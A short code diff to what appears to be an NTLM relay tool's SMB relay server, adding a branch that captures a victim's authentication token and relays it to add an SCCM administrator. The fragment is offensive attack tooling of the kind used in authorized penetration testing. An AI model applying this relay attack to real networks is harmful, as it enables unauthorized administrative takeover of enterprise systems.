@@ -343,6 +343,12 @@ class SMBRelayServer(Thread):
             authenticateMessage.fromString(token)
             self.authUser = authenticateMessage.getUserString()
 
+            if self.config.isADMINAttack:
+                LOG.info("Exiting standard auth flow to add SCCM admin...")
+                self.config.setSCCMAdminToken(token)
+                LOG.info("Authenticating against %s://%s as %s" % (self.target.scheme, self.target.netloc, self.authUser))
+                self.do_attack(client)
+                return
             if rawNTLM is True:
                 respToken2 = SPNEGO_NegTokenResp()
                 respToken2['ResponseToken'] = securityBlob
